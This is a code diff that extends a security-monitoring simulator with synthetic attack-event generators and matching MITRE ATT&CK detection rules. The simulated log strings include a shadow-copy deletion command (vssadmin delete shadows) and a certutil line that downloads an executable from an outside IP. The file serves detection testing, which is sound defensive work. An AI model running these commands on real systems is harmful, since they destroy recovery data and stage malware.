@@ -156,9 +156,95 @@ def _scn_priv_esc(rng):
     }, [])
 
 
+# ── Extended technique coverage (broader ATT&CK: Impact, deeper Credential
+#    Access, Persistence, C2). Each emits a normalised event that the matching
+#    BUILTIN_RULES detection fires on - same contract as the scenarios above. ──
+
+def _scn_ransomware(rng):
+    host = rng.choice(_INTERNAL_HOSTS); user = rng.choice(_USERS); n = rng.randint(800, 12000)
+    return ({
+        "category": "endpoint", "event_type": "file_encrypt", "hostname": host, "username": user,
+        "action": "mass_encrypt", "process_name": "encryptor.exe",
+        "severity_hint": "critical", "mitre_tech_id": "T1486",
+        "raw": f"EDR: {host} {n} files renamed *.locked in 60s by {user} (entropy spike, ransom note dropped)",
+    }, [])
+
+
+def _scn_shadow_delete(rng):
+    host = rng.choice(_INTERNAL_HOSTS); user = rng.choice(_USERS)
+    return ({
+        "category": "endpoint", "event_type": "defense_evasion", "hostname": host, "username": user,
+        "action": "delete_shadows", "process_name": "vssadmin.exe",
+        "severity_hint": "high", "mitre_tech_id": "T1490",
+        "raw": f"EDR: {host} vssadmin.exe delete shadows /all /quiet (user={user})",
+    }, [])
+
+
+def _scn_kerberoast(rng):
+    host = "DC-PROD-01"; user = rng.choice(_USERS); n = rng.randint(15, 80)
+    return ({
+        "category": "identity", "event_type": "kerberos", "hostname": host, "username": user,
+        "action": "tgs_rc4", "severity_hint": "high", "mitre_tech_id": "T1558.003",
+        "raw": f"winlog: EventID=4769 {n} TGS requests enc=0x17(RC4-HMAC) by {user} (kerberoasting)",
+    }, [])
+
+
+def _scn_dns_tunnel(rng):
+    src = _int_ip(rng); host = rng.choice(_INTERNAL_HOSTS); dom = rng.choice(_BAD_DOMAINS)
+    label = "".join(rng.choice("0123456789abcdef") for _ in range(48))
+    return ({
+        "category": "network", "event_type": "dns_tunnel", "src_ip": src, "hostname": host,
+        "action": "dns_exfil", "severity_hint": "high", "mitre_tech_id": "T1071.004",
+        "raw": f"dns: {src} TXT {label}.{dom} (qname>200B, 4k queries/5m to one domain)",
+    }, [{"type": "domain", "value": dom, "threat_type": "dns-tunnel", "confidence": 78}])
+
+
+def _scn_password_spray(rng):
+    src = _pub_ip(rng); n = rng.randint(40, 300)
+    return ({
+        "category": "auth", "event_type": "password_spray", "src_ip": src, "action": "password_spray",
+        "country": rng.choice(_COUNTRIES), "severity_hint": "high", "mitre_tech_id": "T1110.003",
+        "raw": f"idp: {n} distinct accounts tried with one password from {src} in 5m (spray)",
+    }, [{"type": "ip", "value": src, "threat_type": "password-spray", "confidence": 72}])
+
+
+def _scn_impossible_travel(rng):
+    user = rng.choice(_USERS); src = _pub_ip(rng)
+    c = rng.choice(["Russia", "China", "Nigeria", "Iran", "Brazil", "Vietnam"])
+    return ({
+        "category": "identity", "event_type": "login_success", "username": user, "src_ip": src,
+        "action": "impossible_travel", "country": c, "severity_hint": "high", "mitre_tech_id": "T1078",
+        "raw": f"idp: SUCCESS {user} from {src} ({c}) 6min after a login from US (impossible travel)",
+    }, [])
+
+
+def _scn_cloud_key(rng):
+    user = rng.choice(_USERS); src = _pub_ip(rng)
+    return ({
+        "category": "cloud", "event_type": "cloud_audit", "username": user, "src_ip": src,
+        "action": "create_access_key", "country": rng.choice(_COUNTRIES),
+        "severity_hint": "medium", "mitre_tech_id": "T1098.001",
+        "raw": f"cloudtrail: CreateAccessKey by {user} from {src} (new long-lived IAM key)",
+    }, [])
+
+
+def _scn_tool_transfer(rng):
+    host = rng.choice(_INTERNAL_HOSTS); dst = _pub_ip(rng)
+    return ({
+        "category": "endpoint", "event_type": "tool_transfer", "hostname": host, "dest_ip": dst,
+        "action": "lolbin_download", "process_name": "certutil.exe",
+        "severity_hint": "medium", "mitre_tech_id": "T1105",
+        "raw": f"EDR: {host} certutil.exe -urlcache -split -f http://{dst}/a.exe (ingress tool transfer)",
+    }, [{"type": "ip", "value": dst, "threat_type": "malware-staging", "confidence": 60}])
+
+
 _SCENARIOS = [
-    (_scn_brute_force, 0.20), (_scn_c2_beacon, 0.13), (_scn_malware, 0.15),
-    (_scn_web_attack, 0.20), (_scn_exfil, 0.10), (_scn_phishing, 0.15), (_scn_priv_esc, 0.07),
+    (_scn_brute_force, 0.14), (_scn_c2_beacon, 0.09), (_scn_malware, 0.10),
+    (_scn_web_attack, 0.12), (_scn_exfil, 0.07), (_scn_phishing, 0.09), (_scn_priv_esc, 0.05),
+    # Extended coverage
+    (_scn_ransomware, 0.06), (_scn_shadow_delete, 0.04), (_scn_kerberoast, 0.05),
+    (_scn_dns_tunnel, 0.05), (_scn_password_spray, 0.05), (_scn_impossible_travel, 0.04),
+    (_scn_cloud_key, 0.03), (_scn_tool_transfer, 0.02),
 ]
 
 
@@ -214,6 +300,50 @@ BUILTIN_RULES = [
      "mitre_tech_id": "T1078", "mitre_tech": "Valid Accounts",
      "title_tmpl": "Privilege escalation by {username} on {hostname}",
      "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "group_change"}], "logic": "and"}},
+    {"id": "R-RANSOMWARE", "name": "Ransomware mass file encryption", "category": "Endpoint",
+     "severity": "critical", "mitre_tactic": "Impact", "mitre_tactic_id": "TA0040",
+     "mitre_tech_id": "T1486", "mitre_tech": "Data Encrypted for Impact",
+     "title_tmpl": "Ransomware encryption on {hostname} ({username})",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "file_encrypt"}], "logic": "and"}},
+    {"id": "R-SHADOWDEL", "name": "Volume shadow copy deletion", "category": "Endpoint",
+     "severity": "high", "mitre_tactic": "Impact", "mitre_tactic_id": "TA0040",
+     "mitre_tech_id": "T1490", "mitre_tech": "Inhibit System Recovery",
+     "title_tmpl": "Shadow copies deleted on {hostname}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "defense_evasion"},
+                                    {"field": "action", "op": "equals", "value": "delete_shadows"}], "logic": "and"}},
+    {"id": "R-KERBEROAST", "name": "Kerberoasting (RC4 TGS requests)", "category": "Identity",
+     "severity": "high", "mitre_tactic": "Credential Access", "mitre_tactic_id": "TA0006",
+     "mitre_tech_id": "T1558.003", "mitre_tech": "Kerberoasting",
+     "title_tmpl": "Kerberoasting by {username} on {hostname}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "kerberos"},
+                                    {"field": "action", "op": "equals", "value": "tgs_rc4"}], "logic": "and"}},
+    {"id": "R-DNSTUNNEL", "name": "DNS tunneling / exfiltration", "category": "Network",
+     "severity": "high", "mitre_tactic": "Command and Control", "mitre_tactic_id": "TA0011",
+     "mitre_tech_id": "T1071.004", "mitre_tech": "Application Layer Protocol: DNS",
+     "title_tmpl": "DNS tunneling from {hostname} ({src_ip})",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "dns_tunnel"}], "logic": "and"}},
+    {"id": "R-PWSPRAY", "name": "Password spraying", "category": "Identity",
+     "severity": "high", "mitre_tactic": "Credential Access", "mitre_tactic_id": "TA0006",
+     "mitre_tech_id": "T1110.003", "mitre_tech": "Password Spraying",
+     "title_tmpl": "Password spraying from {src_ip}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "password_spray"}], "logic": "and"}},
+    {"id": "R-IMPOSSIBLE", "name": "Impossible-travel login", "category": "Identity",
+     "severity": "high", "mitre_tactic": "Initial Access", "mitre_tactic_id": "TA0001",
+     "mitre_tech_id": "T1078", "mitre_tech": "Valid Accounts",
+     "title_tmpl": "Impossible-travel login: {username} from {country}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "login_success"},
+                                    {"field": "action", "op": "equals", "value": "impossible_travel"}], "logic": "and"}},
+    {"id": "R-CLOUDKEY", "name": "Cloud access-key creation", "category": "Cloud",
+     "severity": "medium", "mitre_tactic": "Persistence", "mitre_tactic_id": "TA0003",
+     "mitre_tech_id": "T1098.001", "mitre_tech": "Additional Cloud Credentials",
+     "title_tmpl": "Cloud access key created by {username}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "cloud_audit"},
+                                    {"field": "action", "op": "equals", "value": "create_access_key"}], "logic": "and"}},
+    {"id": "R-TOOLXFER", "name": "Ingress tool transfer (LOLBin download)", "category": "Endpoint",
+     "severity": "medium", "mitre_tactic": "Command and Control", "mitre_tactic_id": "TA0011",
+     "mitre_tech_id": "T1105", "mitre_tech": "Ingress Tool Transfer",
+     "title_tmpl": "Ingress tool transfer on {hostname}",
+     "definition": {"conditions": [{"field": "event_type", "op": "equals", "value": "tool_transfer"}], "logic": "and"}},
 ]
 
 
